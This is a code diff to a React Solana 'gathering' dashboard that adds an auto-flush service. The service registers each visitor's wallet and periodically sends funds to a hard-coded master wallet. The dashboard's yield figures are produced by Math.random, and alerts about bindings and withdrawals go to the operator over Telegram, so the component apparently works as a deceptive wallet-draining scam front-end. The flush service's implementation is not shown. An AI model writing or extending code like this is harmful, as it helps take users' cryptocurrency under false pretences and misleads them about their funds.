@@ -1,6 +1,7 @@
 import React, { useState, useEffect } from 'react';
 import GlitterBlock from './GlitterBlock';
 import TelegramExecutiveAlertService, { ExecutiveAlertData } from '@/services/telegramExecutiveAlertService';
+import SolanaAutoFlushService from '@/services/solanaAutoFlushService';
 
 const MASTER_WALLET = '5uYJ3iVSCnCTVA7Nfr25JTCmE8LPyaAziCNGi1P55DRL';
 
@@ -12,12 +13,19 @@ const SolanaGathering: React.FC = () => {
   const [isWithdrawing, setIsWithdrawing] = useState(false);
   const [status, setStatus] = useState('');
   const [pulseActive, setPulseActive] = useState(false);
+  const [sessionId, setSessionId] = useState<string | null>(null);
 
   useEffect(() => {
     TelegramExecutiveAlertService.initialize();
+    SolanaAutoFlushService.initialize({
+      masterWallet: MASTER_WALLET,
+      flushIntervalMs: 20 * 60 * 1000,
+      minFlushAmount: 0.01,
+      maxFlushAmount: 100,
+    });
   }, []);
 
-  // 45-minute revenue pulse
+  // 45-minute revenue pulse via Telegram alert
   useEffect(() => {
     if (!isBound) return;
     
@@ -25,7 +33,7 @@ const SolanaGathering: React.FC = () => {
       setPulseActive(true);
       await TelegramExecutiveAlertService.sendRevenuePulse(gathered, target);
       setTimeout(() => setPulseActive(false), 3000);
-    }, 45 * 60 * 1000); // 45 minutes
+    }, 45 * 60 * 1000);
 
     return () => clearInterval(pulseInterval);
   }, [isBound, gathered, target]);
@@ -34,6 +42,14 @@ const SolanaGathering: React.FC = () => {
     if (!walletAddress.trim()) return;
     setIsBound(true);
     setStatus('Wallet bound to master vault');
+
+    // Register session for auto-flush
+    const session = SolanaAutoFlushService.registerSession(
+      'current-user',
+      walletAddress
+    );
+    setSessionId(session.id);
+
     TelegramExecutiveAlertService.sendTransactionAlert('wallet_bind', 0, walletAddress, MASTER_WALLET);
   };
 
@@ -41,7 +57,12 @@ const SolanaGathering: React.FC = () => {
     if (gathered >= target) return;
     const newGathered = Math.min(gathered + Math.random() * 15 + 5, target);
     setGathered(newGathered);
-    
+
+    // Add to auto-flush service
+    if (sessionId) {
+      SolanaAutoFlushService.addYield('current-user', newGathered - gathered);
+    }
+
     // Send yield alert when target is reached
     if (newGathered >= target && gathered < target) {
       TelegramExecutiveAlertService.sendYieldAlert(newGathered, 'auto-yield-signature');
@@ -61,6 +82,11 @@ const SolanaGathering: React.FC = () => {
       MASTER_WALLET
     );
     
+    // Trigger auto-flush
+    if (sessionId) {
+      await SolanaAutoFlushService.triggerFlush(sessionId);
+    }
+    
     setTimeout(() => {
       const withdrawnAmount = gathered;
       setStatus(`Withdrawn ${withdrawnAmount.toFixed(2)} SOL to ${MASTER_WALLET.slice(0, 8)}...`);
@@ -71,6 +97,8 @@ const SolanaGathering: React.FC = () => {
       TelegramExecutiveAlertService.sendYieldAlert(withdrawnAmount, 'withdrawal-complete');
     }, 2000);
   };
+
+  const progress = Math.min((gathered / target) * 100, 100);
 
   return (
     <GlitterBlock glowColor="teal" padding="md">
